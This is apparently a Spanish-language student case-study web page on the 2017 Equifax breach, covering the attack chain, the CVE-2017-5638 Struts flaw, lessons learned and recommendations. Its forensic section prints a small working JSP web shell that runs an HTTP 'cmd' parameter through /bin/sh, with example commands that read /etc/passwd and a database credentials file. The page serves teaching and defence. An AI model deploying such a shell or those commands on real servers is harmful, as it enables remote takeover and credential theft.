+                                            <div style="font-size:22px; margin-bottom:6px;">🐚</div>
+                                            Web Shell<br><span
+                                                style="font-weight:400; font-size:11px;">Persistencia<br>+30
+                                                instancias</span>
+                                        </div>
+                                        <div style="font-size:10px; color:#8b949e; margin-top:6px;">13 mayo
+                                            2017<br>23:50 hrs</div>
+                                    </div>
+
+                                    <!-- Flecha -->
+                                    <div style="color:#58a6ff; font-size:22px; padding:0 4px; margin-bottom:20px;">→
+                                    </div>
+
+                                    <!-- Paso 4 -->
+                                    <div style="text-align:center; width:130px;">
+                                        <div
+                                            style="background:linear-gradient(135deg,#1a1a2e,#7c3aed); border-radius:8px; padding:14px 10px; color:#fff; font-size:12px; font-weight:700; line-height:1.4;">
+                                            <div style="font-size:22px; margin-bottom:6px;">🗄️</div>
+                                            Bases de Datos<br><span
+                                                style="font-weight:400; font-size:11px;">Credenciales<br>en texto
+                                                plano</span>
+                                        </div>
+                                        <div style="font-size:10px; color:#8b949e; margin-top:6px;">Movimiento
+                                            lateral<br>16 mayo 2017</div>
+                                    </div>
+
+                                    <!-- Flecha -->
+                                    <div style="color:#58a6ff; font-size:22px; padding:0 4px; margin-bottom:20px;">→
+                                    </div>
+
+                                    <!-- Paso 5 -->
+                                    <div style="text-align:center; width:130px;">
+                                        <div
+                                            style="background:linear-gradient(135deg,#064e3b,#10b981); border-radius:8px; padding:14px 10px; color:#fff; font-size:12px; font-weight:700; line-height:1.4;">
+                                            <div style="font-size:22px; margin-bottom:6px;">📤</div>
+                                            Exfiltración<br><span style="font-weight:400; font-size:11px;">147.5M
+                                                registros<br>&gt;200 GB</span>
+                                        </div>
+                                        <div style="font-size:10px; color:#8b949e; margin-top:6px;">76 días
+                                            sin<br>detección (SSL vencido)</div>
+                                    </div>
+
+                                </div>
+
+                                <!-- Leyenda -->
+                                <div
+                                    style="margin-top:20px; border-top:1px solid #30363d; padding-top:16px; display:flex; flex-wrap:wrap; gap:16px; justify-content:center; font-size:12px; color:#8b949e;">
+                                    <span>🔴 Vector de entrada</span>
+                                    <span>� Sistema vulnerable</span>
+                                    <span>🔵 Persistencia</span>
+                                    <span>🟣 Movimiento lateral</span>
+                                    <span>🟢 Exfiltración</span>
+                                </div>
+                            </div>
+
+                            <!-- 3.2 Evidencia: Web Shell -->
+                            <h3>3.2 Evidencia Técnica — Representación de Web Shell</h3>
+                            <p>Una <strong>Web Shell</strong> es un script malicioso que los atacantes instalan en un
+                                servidor comprometido para mantener acceso remoto persistente. En el caso Equifax, se
+                                identificaron más de 30 instancias de este tipo de backdoor. A continuación se muestra
+                                una representación simplificada del tipo de código utilizado:</p>
+
+                            <div
+                                style="background:#0d1117; border:1px solid #30363d; border-radius:10px; overflow:hidden; margin:20px 0;">
+                                <!-- Barra de título tipo terminal -->
+                                <div
+                                    style="background:#21262d; padding:10px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #30363d;">
+                                    <span
+                                        style="width:12px;height:12px;border-radius:50%;background:#ff5f57;display:inline-block;"></span>
+                                    <span
+                                        style="width:12px;height:12px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
+                                    <span
+                                        style="width:12px;height:12px;border-radius:50%;background:#28c840;display:inline-block;"></span>
+                                    <span
+                                        style="margin-left:8px; font-size:12px; color:#8b949e; font-family:monospace;">equifax_shell.jsp
+                                        — Evidencia Forense (Mandiant, 2017)</span>
+                                </div>
+                                <!-- Código -->
+                                <pre
+                                    style="margin:0; padding:20px; overflow-x:auto; font-family:'Courier New',monospace; font-size:13px; line-height:1.7; color:#c9d1d9;"><code><span style="color:#8b949e;">// Web Shell detectada en servidor del Portal de Disputas</span>
+<span style="color:#8b949e;">// Tipo: JSP (JavaServer Pages) — Backdoor de ejecución remota</span>
+
+<span style="color:#ff7b72;">&lt;%@ page</span> <span style="color:#79c0ff;">import</span>=<span style="color:#a5d6ff;">"java.io.*,java.util.*,java.net.*"</span> <span style="color:#ff7b72;">%&gt;</span>
+<span style="color:#ff7b72;">&lt;%</span>
+    <span style="color:#8b949e;">// Recibe el comando del atacante vía parámetro HTTP</span>
+    String cmd = request.<span style="color:#d2a8ff;">getParameter</span>(<span style="color:#a5d6ff;">"cmd"</span>);
+
+    <span style="color:#ff7b72;">if</span> (cmd != <span style="color:#79c0ff;">null</span>) {
+        <span style="color:#8b949e;">// Ejecuta el comando en el sistema operativo del servidor</span>
+        Process process = Runtime.<span style="color:#d2a8ff;">getRuntime</span>().<span style="color:#d2a8ff;">exec</span>(
+            <span style="color:#ff7b72;">new</span> String[]{<span style="color:#a5d6ff;">"/bin/sh"</span>, <span style="color:#a5d6ff;">"-c"</span>, cmd}
+        );
+
+        <span style="color:#8b949e;">// Captura y devuelve la salida al atacante</span>
+        BufferedReader reader = <span style="color:#ff7b72;">new</span> <span style="color:#79c0ff;">BufferedReader</span>(
+            <span style="color:#ff7b72;">new</span> <span style="color:#79c0ff;">InputStreamReader</span>(process.<span style="color:#d2a8ff;">getInputStream</span>())
+        );
+        String line;
+        <span style="color:#ff7b72;">while</span> ((line = reader.<span style="color:#d2a8ff;">readLine</span>()) != <span style="color:#79c0ff;">null</span>) {
+            out.<span style="color:#d2a8ff;">println</span>(line);
+        }
+    }
+<span style="color:#ff7b72;">%&gt;</span>
+
+<span style="color:#8b949e;">/* Ejemplo de comandos ejecutados por los atacantes:
+   ?cmd=cat /etc/passwd          → Listado de usuarios del sistema
+   ?cmd=find / -name "*.conf"    → Búsqueda de archivos de configuración
+   ?cmd=cat db_config.properties → Extracción de credenciales en texto plano
+*/</span></code></pre>
+                            </div>
+
+                            <div
+                                style="background:linear-gradient(135deg,#1a0a0a,#2d1515); border-left:4px solid #ef4444; border-radius:0 8px 8px 0; padding:16px 20px; margin:16px 0;">
+                                <p style="margin:0; color:#fca5a5; font-size:13px;">
+                                    ⚠️ <strong>Nota forense:</strong> El comando <code
+                                        style="background:#0d1117; padding:2px 6px; border-radius:4px; font-size:12px;">cat db_config.properties</code>
+                                    fue el punto de inflexión del ataque. Al encontrar credenciales de bases de datos en
+                                    texto plano,
+                                    los atacantes obtuvieron acceso directo a los 147.5 millones de registros sin
+                                    necesidad de
+                                    técnicas adicionales de fuerza bruta.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="article-section">
+                            <h2>4. Reflexión Técnica y Conclusiones</h2>
+                            <p>El ciberataque a Equifax no fue el resultado de una técnica de hackeo
+                                sofisticada e inevitable, sino la consecuencia de una serie de fallas operativas y
+                                negligencias en la gestión de seguridad. A continuación, se presentan los
+                                aprendizajes clave y las acciones preventivas necesarias para cualquier organización:
+                            </p>
+
+                            <ul>
+                                <li><strong>La visibilidad es la base de la protección:</strong> No se puede proteger lo
+                                    que no se sabe que existe. El desconocimiento de que el "Portal de
+                                    Disputas" utilizaba Apache Struts dejó una brecha crítica fuera del alcance de las
+                                    políticas de mantenimiento.</li>
+                                <li><strong>Un parche omitido es una puerta abierta:</strong> La existencia
+                                    de una solución técnica (parche) desde marzo para la vulnerabilidad CVE-2017-5638
+                                    subraya que la velocidad de respuesta es tan vital como la detección misma.</li>
+                                <li><strong>El cifrado sin monitoreo es un punto ciego:</strong> Contar con herramientas
+                                    de inspección es inútil si no se gestionan sus componentes básicos. El
+                                    vencimiento de un certificado SSL por 10 meses permitió que los atacantes
+                                    exfiltraran datos masivos sin ser detectados, ocultos tras el propio cifrado de la
+                                    empresa.</li>
+                                <li><strong>La higiene de datos interna es crítica:</strong> Una vez
+                                    superado el perímetro, la falta de seguridad interna (como credenciales en texto
+                                    plano) facilitó un acceso total a la base de datos central sin necesidad de ataques
+                                    complejos.</li>
+                            </ul>
+
+                            <h3>Recomendaciones estratégicas:</h3>
+                            <ul>
+                                <li><strong>Implementar un Inventario de Activos Dinámico:</strong> Mantener
+                                    un registro automatizado y actualizado de todo el software, versiones y hardware en
+                                    la red para eliminar "puntos ciegos" operativos.</li>
+                                <li><strong>Establecer una Política de Gestión de Parches Críticos:</strong>
+                                    Definir tiempos de respuesta obligatorios (ej. 24-48 horas) para vulnerabilidades
+                                    con severidad alta o crítica (CVSS 10.0), asegurando su cumplimiento en todos los
+                                    niveles de la infraestructura.</li>
+                                <li><strong>Automatizar la Gestión de Certificados:</strong> Utilizar
+                                    herramientas que alerten y renueven automáticamente los certificados SSL/TLS para
+                                    garantizar que la visibilidad y el monitoreo del tráfico (IDS/IPS) nunca se
+                                    interrumpan.</li>
+                                <li><strong>Adoptar el Principio de Privilegio Mínimo y Cifrado de
+                                        Credenciales:</strong> Prohibir estrictamente el almacenamiento de contraseñas
+                                    en texto plano y utilizar soluciones de Gestión de Acceso Privilegiado (PAM) para
+                                    dificultar el movimiento lateral de un atacante.</li>
+                                <li><strong>Segregación y Cifrado de Datos en Reposo:</strong> Aplicar
+                                    técnicas de seudonimización y cifrado directamente en las bases de datos para que,
+                                    en caso de una exfiltración exitosa, la información sea ilegible y carezca de valor
+                                    para el perpetrador.</li>
+                            </ul>
+
+                            <div class="reflection-box">
+                                <p>El análisis del caso Equifax revela que la magnitud de una brecha de seguridad no
+                                    depende únicamente de la habilidad del atacante, sino de la madurez operativa de la
+                                    organización. El incidente de 2017 dejó de ser un simple fallo técnico
+                                    para convertirse en un caso de estudio sobre negligencia sistémica.
+                                </p>
+                                <p>La exposición de datos de 147.5 millones de personas y un costo total estimado de
+                                    $107,115,000,000 MXN demuestran que el ahorro en mantenimiento preventivo es ínfimo
+                                    comparado con las pérdidas operativas, legales y reputacionales que genera un ataque
+                                    exitoso. La ciberseguridad no puede gestionarse de forma aislada; debe
+                                    estar integrada en la Cadena de Mando de TI.</p>
+                                <p>El caso Equifax es un recordatorio de que marcos como ISO 27001 y NIST CSF no son
+                                    solo requisitos de cumplimiento, sino herramientas de supervivencia.
+                                    Para una organización moderna, la ciberseguridad es una responsabilidad
+                                    ética y financiera: la confianza del cliente, una vez perdida por fallos evitables
+                                    como la falta de un parche o un certificado vencido, es el activo más difícil y
+                                    costoso de recuperar.</p>
+                            </div>
+                        </div>
+
+                        <div class="article-section">
+                            <h2>Glosario / Ficha Técnica</h2>
+                            <h3>FICHA TÉCNICA: CVE-2017-5638</h3>
+                            <ul>
+                                <li><strong>Nombre Clave:</strong> Apache Struts RCE (Remote Code
+                                    Execution).</li>
+                                <li><strong>Gravedad:</strong> 10.0 Crítico (Máxima prioridad en la escala
+                                    CVSS).</li>
+                                <li><strong>Definición:</strong> Vulnerabilidad de ejecución remota de
+                                    código que permite a un atacante tomar control total de un servidor web sin
+                                    necesidad de usuario ni contraseña.</li>
+                                <li><strong>Modus Operandi:</strong> El atacante envía una petición HTTP con código
+                                    malicioso oculto en el encabezado. El servidor, al intentar procesar un
+                                    error de este encabezado, termina ejecutando los comandos del atacante.</li>
+                                <li><strong>Relación con Equifax:</strong> Fue la puerta de entrada principal.
+                                    El parche existía desde marzo de 2017, pero Equifax no lo aplicó,
+                                    dejando la vulnerabilidad expuesta durante meses.</li>
+                                <li><strong>Impacto Legal:</strong> Su aprovechamiento permitió el robo de
+                                    datos de 147.5 millones de personas, lo que constituye una falla crítica en los
+                                    controles de seguridad exigidos por la ISO 27001 y el marco NIST.</li>
+                            </ul>
+                        </div>
+
+                        <div class="article-section">
+                            <h2>5. Referencias Técnicas / Bibliografía</h2>
+                            <ul class="reference-list">
+                                <li>[1] U.S. Government Accountability Office (GAO): Reporte GAO-18-559, "Data
+                                    Protection: Actions Taken by Equifax and Federal Agencies in Response to the 2017
+                                    Breach". Es el documento más completo que detalla los fallos de parcheo
+                                    y la falta de visibilidad técnica.</li>
+                                <li>[2] House of Representatives (Committee on Oversight and Government Reform): Reporte
+                                    final de 96 páginas titulado "The Equifax Data Breach". Este informe
+                                    concluye que el ataque fue "completamente evitable" y detalla el uso de las web
+                                    shells y el robo de credenciales en texto plano.</li>
+                                <li>[3] Federal Trade Commission (FTC): Documentación sobre el acuerdo
+                                    judicial (settlement) y las sanciones económicas impuestas por la falta de
+                                    protección de datos personales.</li>
+                            </ul>
+                        </div>
+
+                        <div class="pdf-section">
+                            <a href="./actividades/Act01_Equipo1.pdf" download class="btn-pdf">
+                                📄 Descargar PDF
+                            </a>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer-container text-center">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12">
+                    <p>© 2026 Pedro Jasso (AKKU) | Universidad Politécnica De San Luis Potosí | <a
+                            href="./presentacion.html" title="">Presentación</a> | <a href="./contacto.html"
+                            title="">Contacto</a></p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function (event) {
+            navActivePage();
+        });
+    </script>
+
+    <script type="text/javascript" src="./main.70a66962.js"></script>
+</body>
+
+</html>
